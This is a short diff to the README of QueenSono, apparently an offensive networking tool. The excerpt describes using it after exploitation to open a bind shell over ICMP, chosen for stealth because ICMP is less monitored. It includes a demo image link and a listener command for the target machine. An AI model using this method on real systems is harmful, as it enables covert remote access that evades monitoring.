@@ -10,7 +10,10 @@ Some fun things using `QueenSono`
 ### Use case
 ***In Post exploitation phase:*** Sometimes, and for the post exploitation phase it is more suited, you need a bind shell. if ICMP is less monitored than other protocol (eg TCP), having a bind shell trough `QueenSono` is more stealthy.
 
-#### How to do it
+#### How to do it?
+
+![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-bind.gif)
+
 *> On the target machine:* Launch your listener
 ```
 ./listener.sh <ip_listening_for_icmp>
